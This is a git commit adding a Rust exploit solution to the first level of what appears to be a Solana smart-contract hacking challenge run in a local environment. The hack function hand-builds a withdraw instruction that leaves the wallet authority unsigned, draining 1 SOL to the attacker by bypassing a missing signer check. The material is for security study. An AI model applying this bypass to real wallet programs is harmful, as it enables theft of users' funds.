1785989b1918e54717ffe3019183ac9196ac676a
steccas <steccas@pm.me>
2022-10-07 15:12:40 +0000

    Add level1 hack code to study

--- pocs/src/bin/level1.rs
+++ pocs/src/bin/level1.rs
@@ -1,3 +1,5 @@
+//FOUND
+
 use std::{env, str::FromStr};
 
 use owo_colors::OwoColorize;
@@ -18,7 +20,25 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
+    let tx = env.execute_as_transaction(
+        // we construct the instruction manually here
+        // because the level1::withdraw function sets the is_signer flag on the authority
+        // but we don't want to sign 
+        &[Instruction {
+            program_id: challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(challenge.wallet_address, false),
+                AccountMeta::new(challenge.wallet_authority, false),
+                AccountMeta::new(challenge.hacker.pubkey(), true),
+                AccountMeta::new_readonly(system_program::id(), false),
+            ],
+            data: WalletInstruction::Withdraw { amount: sol_to_lamports(1.0) }.try_to_vec().unwrap(),
+        }],
+        &[&challenge.hacker],
+    );
+    tx.print_named("haxx");
+}
 
 /*
 SETUP CODE BELOW
